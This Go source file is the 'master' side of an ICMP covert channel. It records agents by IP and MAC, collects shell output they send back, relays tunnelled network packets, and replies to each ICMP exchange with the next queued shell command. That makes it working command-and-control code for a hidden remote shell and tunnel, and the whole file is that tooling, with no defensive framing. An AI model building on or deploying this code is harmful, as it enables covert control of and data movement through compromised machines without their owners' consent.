package app

import (
	"context"
	"log"

	"protocol/icmp/internal/protocol"
	"protocol/icmp/internal/transport"
	"protocol/icmp/internal/tunnel"
)

type CommandSource interface {
	NextCommand(context.Context, string) ([]byte, error)
}

type ResultSink interface {
	WriteResult(string, []byte) error
}

type AgentTracker interface {
	TouchAgent(agentIP string, mac string)
}

type MasterService struct {
	Responder     transport.MasterResponder
	Commands      CommandSource
	Results       ResultSink
	Agents        AgentTracker
	TunnelManager *tunnel.TunnelManager
}

func (s MasterService) Run(ctx context.Context) error {
	return s.Responder.Serve(ctx, func(ctx context.Context, req protocol.RequestContext) ([]byte, error) {
		agentIP := req.Meta.SrcIP.String()
		if s.Agents != nil {
			s.Agents.TouchAgent(agentIP, req.Meta.SrcMAC.String())
		}
		if len(req.Exchange.Payload) == 0 {
			return nil, nil
		}

		protoID := req.Exchange.Payload[0]
		payload := req.Exchange.Payload[1:]

		if protoID == protocol.ProtocolTunnel {
			log.Printf("[Master] Received ProtocolTunnel length=%d", len(payload))
			if s.TunnelManager != nil {
				s.TunnelManager.HandlePacket(payload)
			}
		} else if protoID == protocol.ProtocolShell {
			if len(payload) > 0 && s.Results != nil {
				if err := s.Results.WriteResult(agentIP, payload); err != nil {
					return nil, err
				}
			}
		}

		// Try to send tunnel packets first
		if s.TunnelManager != nil {
			if tunnelBuf := s.TunnelManager.TryDequeue(); tunnelBuf != nil {
				log.Printf("[Master] Sending ProtocolTunnel length=%d", len(tunnelBuf))
				return append([]byte{0x55, protocol.ProtocolTunnel}, tunnelBuf...), nil
			}
		}

		if s.Commands == nil {
			return []byte{0x55, protocol.ProtocolShell}, nil
		}
		cmd, err := s.Commands.NextCommand(ctx, agentIP)
		if err != nil {
			return nil, err
		}
		return append([]byte{0x55, protocol.ProtocolShell}, cmd...), nil
	})
}
